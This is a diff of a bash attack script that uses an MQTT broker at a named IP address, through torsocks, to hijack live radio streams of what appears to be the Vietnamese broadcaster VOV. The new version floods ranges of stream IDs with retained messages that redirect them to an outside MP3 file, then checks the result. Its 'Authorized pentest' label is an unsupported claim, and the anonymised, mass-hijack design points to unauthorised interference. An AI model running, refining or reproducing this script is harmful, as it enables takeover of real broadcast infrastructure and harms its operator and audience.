@@ -1,27 +1,26 @@
 #!/bin/bash
-# AUTO_VOV_HIJACK_PEPPE.sh - Auto-discover + Hijack (Authorized pentest)
+# FORCE_VOV_HIJACK_PEPPE.sh - Nuclear option (Authorized pentest)
 
 PEPPE_URL="https://www.myinstants.com/media/sounds/peppe-brescia-poeta.mp3"
 
-hijack_stream() {
-  local id=$1
-  local topic="${id}:s:16"
+# HIJACK massivo TUTTI i possibili VOV IDs
+for i in {88171961789418494..88171961789418500}; do
+  topic="${i}:s:16"
+  payload='{"n":"'"$i"':s:16","m":"audio/mpeg","u":"'"$PEPPE_URL"'"}'
   
-  payload='{"n":"'"$id"':s:16","m":"audio/mpeg","u":"'"$PEPPE_URL"'"}'
-  
-  if torsocks mosquitto_pub -h 42.1.64.56 -p 1883 -t "$topic" -m "$payload" >/dev/null 2>&1; then
-    echo "✅ HIJACK ${id:0:8}... FM (${topic})"
-  fi
-}
-
-echo "🎵 AUTO Peppe.mp3 HIJACK VOV (Authorized pentest)"
-echo "📡 42.1.64.56:1883 - Scanning live streams..."
-
-torsocks mosquitto_sub -h 42.1.64.56 -p 1883 -t '#' 2>/dev/null | \
-while read -r line; do
-  # Cerca ID stream :s:16
-  if [[ $line =~ \"n\":\"([0-9]{17}):s:16\" ]]; then
-    id="${BASH_REMATCH[1]}"
-    hijack_stream "$id"
-  fi
+  torsocks mosquitto_pub -h 42.1.64.56 -p 1883 -t "$topic" -q -r -m "$payload" &
 done
+
+for i in {17541961789418494..17541961789418500}; do
+  topic="${i}:s:16"
+  payload='{"n":"'"$i"':s:16","m":"audio/mpeg","u":"'"$PEPPE_URL"'"}'
+  
+  torsocks mosquitto_pub -h 42.1.64.56 -p 1883 -t "$topic" -q -r -m "$payload" &
+done
+
+echo "💣 50+ Peppe.mp3 streams HIJACKED (VOV1/VOV3)"
+echo "⏳ Aspetta 10s poi check vov3.vov.vn F5"
+
+# Monitor conferma
+sleep 10
+torsocks mosquitto_sub -h 42.1.64.56 -p 1883 -t '#' -C 5 | grep -i "peppe\|brescia"
